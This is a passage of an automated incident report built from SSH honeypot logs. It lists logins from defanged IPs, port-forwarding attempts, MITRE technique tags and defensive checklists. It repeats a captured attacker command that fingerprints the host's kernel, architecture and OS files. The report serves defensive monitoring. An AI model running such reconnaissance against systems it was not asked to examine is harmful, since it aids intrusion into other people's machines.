- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03789c6e080a

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-07-21 19:12 |
| **Last Seen** | 2026-07-21 19:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:12:13` | `cowrie.session.connect` |
| `2026-07-21 19:12:13` | `cowrie.client.version` |
| `2026-07-21 19:12:13` | `cowrie.client.kex` |
| `2026-07-21 19:12:16` | `cowrie.login.success` |
| `2026-07-21 19:12:16` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5333ee45375d

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-21 19:12 |
| **Last Seen** | 2026-07-21 19:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:12:26` | `cowrie.session.connect` |
| `2026-07-21 19:12:27` | `cowrie.client.version` |
| `2026-07-21 19:12:27` | `cowrie.client.kex` |
| `2026-07-21 19:12:30` | `cowrie.login.success` |
| `2026-07-21 19:12:30` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6da1bc31d49d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 19:12 |
| **Last Seen** | 2026-07-21 19:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:12:49` | `cowrie.session.connect` |
| `2026-07-21 19:12:49` | `cowrie.client.version` |
| `2026-07-21 19:12:49` | `cowrie.client.kex` |
| `2026-07-21 19:12:50` | `cowrie.login.success` |
| `2026-07-21 19:12:50` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:12:50` | `cowrie.direct-tcpip.data` |
| `2026-07-21 19:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63cc2fc70dfa

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 19:13 |
| **Last Seen** | 2026-07-21 19:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:13:05` | `cowrie.session.connect` |
| `2026-07-21 19:13:05` | `cowrie.client.version` |
| `2026-07-21 19:13:05` | `cowrie.client.kex` |
| `2026-07-21 19:13:05` | `cowrie.login.success` |
| `2026-07-21 19:13:06` | `cowrie.session.params` |
| `2026-07-21 19:13:06` | `cowrie.command.input` |
| `2026-07-21 19:13:06` | `cowrie.log.closed` |
| `2026-07-21 19:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef42cebefb24

| Field | Detail |
|---|---|
| **Source IP** | `37.238.45[.]202` |
| **First Seen** | 2026-07-21 19:13 |
| **Last Seen** | 2026-07-21 19:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:13:52` | `cowrie.session.connect` |
| `2026-07-21 19:13:53` | `cowrie.client.version` |
| `2026-07-21 19:13:53` | `cowrie.client.kex` |
| `2026-07-21 19:13:54` | `cowrie.login.success` |
| `2026-07-21 19:13:54` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.238.45[.]202` to AbuseIPDB if not already reported
- [ ] Block `37.238.45[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781c4e10d6cf

| Field | Detail |
|---|---|
| **Source IP** | `156.238.86[.]2` |
| **First Seen** | 2026-07-21 19:13 |
| **Last Seen** | 2026-07-21 19:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:13:59` | `cowrie.session.connect` |
| `2026-07-21 19:14:00` | `cowrie.client.version` |
| `2026-07-21 19:14:00` | `cowrie.client.kex` |
| `2026-07-21 19:14:01` | `cowrie.login.success` |
| `2026-07-21 19:14:02` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.238.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `156.238.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e823888f9cf7

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-21 19:15 |
| **Last Seen** | 2026-07-21 19:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:15:22` | `cowrie.session.connect` |
| `2026-07-21 19:15:23` | `cowrie.client.version` |
| `2026-07-21 19:15:23` | `cowrie.client.kex` |
| `2026-07-21 19:15:24` | `cowrie.login.success` |
| `2026-07-21 19:15:25` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c4ec9968abf

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]108` |
| **First Seen** | 2026-07-21 19:15 |
| **Last Seen** | 2026-07-21 19:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:15:34` | `cowrie.session.connect` |
| `2026-07-21 19:15:35` | `cowrie.client.version` |
| `2026-07-21 19:15:35` | `cowrie.client.kex` |
| `2026-07-21 19:15:36` | `cowrie.login.success` |
| `2026-07-21 19:15:36` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]108` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f5acc0d5fa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:17 |
| **Last Seen** | 2026-07-21 19:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:17:08` | `cowrie.session.connect` |
| `2026-07-21 19:17:08` | `cowrie.client.version` |
| `2026-07-21 19:17:08` | `cowrie.client.kex` |
| `2026-07-21 19:17:10` | `cowrie.login.success` |
| `2026-07-21 19:17:12` | `cowrie.session.params` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:12` | `cowrie.command.success` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:12` | `cowrie.command.input` |
| `2026-07-21 19:17:13` | `cowrie.log.closed` |
| `2026-07-21 19:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0607fe8e37cd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:18 |
| **Last Seen** | 2026-07-21 19:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:18:55` | `cowrie.session.connect` |
| `2026-07-21 19:18:56` | `cowrie.client.version` |
| `2026-07-21 19:18:56` | `cowrie.client.kex` |
| `2026-07-21 19:18:59` | `cowrie.login.success` |
| `2026-07-21 19:19:01` | `cowrie.session.params` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:01` | `cowrie.command.success` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:01` | `cowrie.command.input` |
| `2026-07-21 19:19:02` | `cowrie.log.closed` |
| `2026-07-21 19:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a35d0d28f2fb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:20 |
| **Last Seen** | 2026-07-21 19:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:20:54` | `cowrie.session.connect` |
| `2026-07-21 19:20:55` | `cowrie.client.version` |
| `2026-07-21 19:20:55` | `cowrie.client.kex` |
| `2026-07-21 19:20:57` | `cowrie.login.success` |
| `2026-07-21 19:20:59` | `cowrie.session.params` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:20:59` | `cowrie.command.success` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:20:59` | `cowrie.command.input` |
| `2026-07-21 19:21:00` | `cowrie.log.closed` |
| `2026-07-21 19:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af73c6acb37d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:22 |
| **Last Seen** | 2026-07-21 19:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:22:48` | `cowrie.session.connect` |
| `2026-07-21 19:22:48` | `cowrie.client.version` |
| `2026-07-21 19:22:48` | `cowrie.client.kex` |
| `2026-07-21 19:22:51` | `cowrie.login.success` |
| `2026-07-21 19:22:53` | `cowrie.session.params` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:53` | `cowrie.command.success` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:53` | `cowrie.command.input` |
| `2026-07-21 19:22:54` | `cowrie.log.closed` |
| `2026-07-21 19:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9e8a16489a6

| Field | Detail |
|---|---|
| **Source IP** | `223.107.72[.]234` |
| **First Seen** | 2026-07-21 19:24 |
| **Last Seen** | 2026-07-21 19:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:24:22` | `cowrie.session.connect` |
| `2026-07-21 19:24:22` | `cowrie.client.version` |
| `2026-07-21 19:24:22` | `cowrie.client.kex` |
| `2026-07-21 19:24:25` | `cowrie.login.success` |
| `2026-07-21 19:24:25` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.107.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `223.107.72[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1332b27e90

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:24 |
| **Last Seen** | 2026-07-21 19:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:24:36` | `cowrie.session.connect` |
| `2026-07-21 19:24:36` | `cowrie.client.version` |
| `2026-07-21 19:24:36` | `cowrie.client.kex` |
| `2026-07-21 19:24:38` | `cowrie.login.success` |
| `2026-07-21 19:24:40` | `cowrie.session.params` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:40` | `cowrie.command.success` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:40` | `cowrie.command.input` |
| `2026-07-21 19:24:41` | `cowrie.log.closed` |
| `2026-07-21 19:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e71f70bb57d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:26 |
| **Last Seen** | 2026-07-21 19:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:26:19` | `cowrie.session.connect` |
| `2026-07-21 19:26:20` | `cowrie.client.version` |
| `2026-07-21 19:26:20` | `cowrie.client.kex` |
| `2026-07-21 19:26:22` | `cowrie.login.success` |
| `2026-07-21 19:26:24` | `cowrie.session.params` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:24` | `cowrie.command.success` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:24` | `cowrie.command.input` |
| `2026-07-21 19:26:25` | `cowrie.log.closed` |
| `2026-07-21 19:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-075d04ccc047

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-07-21 19:27 |
| **Last Seen** | 2026-07-21 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:27:42` | `cowrie.session.connect` |
| `2026-07-21 19:27:42` | `cowrie.client.version` |
| `2026-07-21 19:27:42` | `cowrie.client.kex` |
| `2026-07-21 19:27:44` | `cowrie.login.success` |
| `2026-07-21 19:27:45` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42521a15f6b8

| Field | Detail |
|---|---|
| **Source IP** | `125.19.244[.]62` |
| **First Seen** | 2026-07-21 19:27 |
| **Last Seen** | 2026-07-21 19:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:27:51` | `cowrie.session.connect` |
| `2026-07-21 19:27:51` | `cowrie.client.version` |
| `2026-07-21 19:27:51` | `cowrie.client.kex` |
| `2026-07-21 19:27:53` | `cowrie.login.success` |
| `2026-07-21 19:27:54` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.19.244[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.19.244[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a625f776ab43

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 19:28 |
| **Last Seen** | 2026-07-21 19:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:28:06` | `cowrie.session.connect` |
| `2026-07-21 19:28:06` | `cowrie.client.version` |
| `2026-07-21 19:28:06` | `cowrie.client.kex` |
| `2026-07-21 19:28:08` | `cowrie.login.success` |
| `2026-07-21 19:28:09` | `cowrie.session.params` |
| `2026-07-21 19:28:09` | `cowrie.command.input` |
| `2026-07-21 19:28:09` | `cowrie.command.input` |
| `2026-07-21 19:28:09` | `cowrie.command.input` |
| `2026-07-21 19:28:10` | `cowrie.command.input` |
| `2026-07-21 19:28:10` | `cowrie.command.input` |
| `2026-07-21 19:28:10` | `cowrie.command.success` |
